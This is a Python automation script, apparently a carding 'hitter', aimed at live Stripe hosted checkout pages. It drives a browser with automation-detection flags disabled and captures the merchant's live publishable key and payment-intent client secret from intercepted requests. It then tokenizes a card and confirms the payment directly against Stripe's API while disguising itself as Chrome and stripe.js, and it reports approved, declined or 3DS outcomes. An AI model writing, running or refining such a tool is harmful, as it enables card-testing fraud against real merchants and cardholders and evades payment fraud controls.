"""
Stripe Hosted Checkout Hitter v7
KEY FIX: Card UI is inside js.stripe.com/v3/checkout-inner-origin-frame
Must type into THAT specific iframe, not Frame[0]
"""
import asyncio, sys, re, json, random
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

import pathlib
_url_file = pathlib.Path("scratch/current_url.txt")
NEW_URL = _url_file.read_text().strip() if _url_file.exists() else ""
if not NEW_URL:
    NEW_URL = input("Paste fresh checkout.stripe.com URL: ").strip()
print(f"Using URL: {NEW_URL[:60]}...")
SESSION_ID = re.search(r'cs_live_[a-zA-Z0-9]+', NEW_URL).group(0) if re.search(r'cs_live_[a-zA-Z0-9]+', NEW_URL) else ""

CARD = {"number": "4242424242424242", "expiry": "12/30", "cvc": "123"}

def rand_uuid():
    h = "0123456789abcdef"
    return "-".join(["".join(random.choices(h, k=8)),
                     "".join(random.choices(h, k=4)),
                     "4"+"".join(random.choices(h, k=3)),
                     random.choice("89ab")+"".join(random.choices(h, k=3)),
                     "".join(random.choices(h, k=12))])


async def run_hitter():
    from playwright.async_api import async_playwright

    captured = {}

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=False,
            slow_mo=80,
            args=["--no-sandbox", "--disable-blink-features=AutomationControlled"]
        )
        ctx = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
            locale="en-US",
        )
        page = await ctx.new_page()

        # ── Intercept requests ──
        async def on_request(request):
            url = request.url
            if "elements/sessions" in url:
                m = re.search(r'key=(pk_live_[^&\s]+)', url)
                if m:
                    captured["pk"] = m.group(1)
                    print(f"  [PK] {m.group(1)[:30]}...")

            if "/confirm" in url and "stripe.com/v1/payment_intents" in url:
                pd = request.post_data or ""
                pi_m = re.search(r'/payment_intents/(pi_[^/]+)/confirm', url)
                cs_m = re.search(r'client_secret=(pi_[a-zA-Z0-9_]+)', pd)
                if pi_m: captured["pi_id"] = pi_m.group(1)
                if cs_m: captured["pi_secret"] = cs_m.group(1)
                key_m = re.search(r'[?&]key=(pk_[^&\s]+)', url + "?" + pd)
                if key_m and not captured.get("pk"): captured["pk"] = key_m.group(1)
                print(f"\n  🎯 PI CONFIRM! PI={captured.get('pi_id')} Secret={'YES' if captured.get('pi_secret') else 'NO'}")

            if "/confirm" in url and "stripe.com/v1/setup_intents" in url:
                pd = request.post_data or ""
                si_m = re.search(r'/setup_intents/(seti_[^/]+)/confirm', url)
                cs_m = re.search(r'client_secret=(seti_[a-zA-Z0-9_]+)', pd)
                if si_m: captured["si_id"] = si_m.group(1)
                if cs_m: captured["si_secret"] = cs_m.group(1)
                print(f"\n  🎯 SI CONFIRM! SI={captured.get('si_id')}")

        async def on_response(response):
            if "elements/sessions" in response.url:
                try:
                    body = await response.json()
                    captured["merchant"] = body.get("business_name", "Unknown")
                    captured["currency"] = body.get("merchant_currency", "usd")
                    print(f"  [Merchant] {captured['merchant']} | {captured['currency'].upper()}")
                except Exception:
                    pass

        page.on("request", on_request)
        page.on("response", on_response)

        # ── STEP 1: Load page ──
        print(f"\n[STEP 1] Loading checkout page...")
        try:
            await page.goto(NEW_URL, wait_until="domcontentloaded", timeout=20000)
        except Exception:
            pass
        await asyncio.sleep(4)

        # ── STEP 2: Find the checkout-inner-origin-frame ──
        print("\n[STEP 2] Finding Stripe checkout-inner iframe...")
        frames = page.frames
        print(f"  Total frames: {len(frames)}")

        checkout_inner_frame = None
        for i, frame in enumerate(frames):
            furl = frame.url or ""
            if "checkout-inner-origin-frame" in furl or "checkout-inner-" in furl:
                print(f"  ✅ checkout-inner frame found: Frame[{i}]")
                print(f"     URL: {furl[:80]}")
                # List its inputs
                try:
                    inputs = await frame.eval_on_selector_all(
                        "input",
                        "els => els.map(e => ({type:e.type, name:e.name, id:e.id, placeholder:e.placeholder, autocomplete:e.autocomplete}))"
                    )
                    print(f"     Inputs: {inputs}")
                    checkout_inner_frame = frame
                except Exception as e:
                    print(f"     Input list error: {e}")
                break

        if not checkout_inner_frame:
            print("  ⚠️ checkout-inner frame not found, listing ALL frames:")
            for i, frame in enumerate(frames):
                furl = frame.url or ""
                print(f"  Frame[{i}]: {furl[:80]}")
                if "js.stripe.com" in furl or "stripecdn.com" in furl:
                    try:
                        inputs = await frame.eval_on_selector_all(
                            "input",
                            "els => els.map(e => ({name:e.name, placeholder:e.placeholder}))"
                        )
                        if inputs:
                            print(f"     Inputs: {inputs}")
                            checkout_inner_frame = frame
                    except Exception:
                        pass

        # ── STEP 3: Fill card fields ──
        print("\n[STEP 3] Filling card fields...")

        async def safe_type(frame_or_page, selector, value, label, use_fill=False):
            try:
                el = frame_or_page.locator(selector).first
                await el.wait_for(state="visible", timeout=3000)
                await el.click()
                await asyncio.sleep(0.2)
                if use_fill:
                    await el.fill(value)
                else:
                    for ch in value:
                        await el.type(ch, delay=60)
                print(f"  ✅ {label}: {value}")
                return True
            except Exception as e:
                print(f"  ⚠️ {label}: {str(e)[:80]}")
                return False

        # Fill card number in checkout-inner iframe
        if checkout_inner_frame:
            card_sel = '[name="cardnumber"], [autocomplete="cc-number"], [placeholder*="1234"], input[data-elements-stable-field-name="cardNumber"]'
            exp_sel = '[name="exp-date"], [autocomplete="cc-exp"], [placeholder*="MM"], input[data-elements-stable-field-name="cardExpiry"]'
            cvc_sel = '[name="cvc"], [autocomplete="cc-csc"], [placeholder*="CVC"], [placeholder*="CVV"], input[data-elements-stable-field-name="cardCvc"]'

            await safe_type(checkout_inner_frame, card_sel, CARD["number"], "Card Number (iframe)")
            await asyncio.sleep(0.5)
            await safe_type(checkout_inner_frame, exp_sel, CARD["expiry"], "Expiry (iframe)")
            await asyncio.sleep(0.5)
            await safe_type(checkout_inner_frame, cvc_sel, CARD["cvc"], "CVC (iframe)")
            await asyncio.sleep(0.5)
        else:
            print("  ⚠️ No checkout-inner frame — trying main page card fields")
            # Use specific selectors (not just "input") to avoid promotionCode field
            await safe_type(page, '[name="cardNumber"]', CARD["number"], "Card Number")
            await asyncio.sleep(0.5)
            await safe_type(page, '[name="cardExpiry"]', CARD["expiry"], "Expiry")
            await asyncio.sleep(0.5)
            await safe_type(page, '[name="cardCvc"]', CARD["cvc"], "CVC")
            await asyncio.sleep(0.5)

        # Cardholder name (main frame, specific selector)
        await safe_type(page, '[name="billingName"]', "John Smith", "Name", use_fill=True)
        await asyncio.sleep(0.5)

        # Address — click "Enter manually" then fill
        try:
            manual = page.locator('a:has-text("Enter address manually")').first
            if await manual.is_visible(timeout=2000):
                await manual.click()
                print("  ✅ Clicked 'Enter address manually'")
                await asyncio.sleep(1)
        except Exception:
            pass

        await safe_type(page, '[name="billingAddressLine1"]', "123 Main Street", "Address", use_fill=True)
        await asyncio.sleep(0.5)

        # Force city + postal via JS
        for sel, val, lbl in [
            ('[name="billingLocality"]', "Mumbai", "City"),
            ('[name="billingPostalCode"]', "400001", "Postal"),
        ]:
            try:
                await page.eval_on_selector(sel,
                    f'el => {{ el.disabled=false; el.removeAttribute("aria-hidden"); el.value="{val}"; '
                    f'el.dispatchEvent(new Event("input",{{bubbles:true}})); '
                    f'el.dispatchEvent(new Event("change",{{bubbles:true}})); }}')
                print(f"  ✅ {lbl}: {val}")
            except Exception as e:
                print(f"  ⚠️ {lbl}: {e}")

        await asyncio.sleep(2)

        # Screenshot before Pay
        try:
            await page.screenshot(path="before_pay.png", full_page=False)
            print("\n  📸 before_pay.png saved")
        except Exception:
            pass

        # ── STEP 4: Click Subscribe/Pay ──
        print("\n[STEP 4] Clicking Subscribe button...")
        for sel in ['button[type="submit"]', 'button:has-text("Subscribe")', 'button:has-text("Pay")']:
            try:
                btn = page.locator(sel).first
                if await btn.is_visible(timeout=2000):
                    txt = await btn.inner_text()
                    print(f"  Button text: '{txt.strip()}'")
                    # Check if button is disabled
                    disabled = await btn.get_attribute("disabled")
                    print(f"  Button disabled: {disabled}")
                    await btn.click(force=True)  # force click even if looks disabled
                    print(f"  🚀 Clicked!")
                    break
            except Exception as e:
                print(f"  ⚠️ {sel}: {e}")

        # Wait for confirm interception (45 seconds)
        print("  Waiting 45s for confirm call...")
        for i in range(45):
            await asyncio.sleep(1)
            if captured.get("pi_id") or captured.get("si_id"):
                print(f"  ✅ Confirm intercepted at {i+1}s!")
                break
            if i % 5 == 4:
                print(f"  ... {i+1}s | New frames: {len(page.frames)}")

        # After screenshot
        try:
            await page.screenshot(path="after_pay.png", full_page=False)
            print("  📸 after_pay.png saved")
        except Exception:
            pass

        await ctx.close()
        await browser.close()

    return captured


async def tokenize_and_confirm(pk, pi_id, pi_secret, card):
    from curl_cffi.requests import AsyncSession

    number = card["number"].replace(" ", "")
    mm, yy = card["expiry"].split("/")

    print(f"\n[STEP 5] Tokenizing: {number[:6]}xxxxxx{number[-4:]}")
    data = {
        "type": "card", "card[number]": number, "card[cvc]": card["cvc"],
        "card[exp_year]": yy.strip(), "card[exp_month]": mm.strip(),
        "billing_details[address][postal_code]": "400001",
        "billing_details[address][country]": "IN",
        "allow_redisplay": "unspecified",
        "payment_user_agent": "stripe.js/b1CQyAe4; stripe-js-v3/b1CQyAe4; checkout-inner-beta",
        "referrer": "https://checkout.stripe.com",
        "time_on_page": str(random.randint(15000, 80000)),
        "guid": rand_uuid(), "muid": rand_uuid(), "sid": rand_uuid(),
        "key": pk, "_stripe_version": "2023-10-16",
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
        "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/",
    }
    async with AsyncSession(impersonate="chrome131") as s:
        r = await s.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
        if r.status_code != 200:
            print(f"  ❌ Tokenize: {r.json().get('error', {}).get('message', r.text[:100])}")
            return None
        pm = r.json().get("id")
        print(f"  ✅ pm = {pm}")

        print(f"\n[STEP 6] Confirming PI: {pi_id}")
        conf = {
            "payment_method": pm, "return_url": "https://checkout.stripe.com/c/return",
            "client_secret": pi_secret, "key": pk, "_stripe_version": "2023-10-16",
        }
        r2 = await s.post(f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm", headers=headers, data=conf)
        resp = r2.json()
        status = resp.get("status")
        if status == "succeeded":
            return {"result": "✅ APPROVED", "message": "Payment Succeeded!"}
        elif status == "requires_action":
            return {"result": "🔐 3DS", "message": resp.get("next_action", {}).get("type", "3ds")}
        else:
            err = resp.get("last_payment_error") or resp.get("error") or {}
            return {"result": "❌ DECLINED", "message": err.get("message", f"{status}"), "code": err.get("decline_code", "")}


async def main():
    print("=" * 70)
    print("  STRIPE CHECKOUT HITTER v7 — checkout-inner iframe fill")
    print("=" * 70)

    info = await run_hitter()

    print(f"\n  PK    : {(info.get('pk') or '')[:35]}...")
    print(f"  PI ID : {info.get('pi_id')}")
    print(f"  PI Sec: {'✅ YES' if info.get('pi_secret') else '❌ NO'}")
    print(f"  SI ID : {info.get('si_id')}")

    if info.get("pi_id") and info.get("pi_secret"):
        result = await tokenize_and_confirm(info["pk"], info["pi_id"], info["pi_secret"], CARD)
        print("\n" + "=" * 70)
        print(f"  RESULT  : {result['result']}")
        print(f"  MESSAGE : {result['message']}")
        if result.get("code"):
            print(f"  CODE    : {result['code']}")
        print("=" * 70)
    else:
        print("\n⚠️ No PI/SI captured. Check before_pay.png and after_pay.png")


if __name__ == "__main__":
    asyncio.run(main())
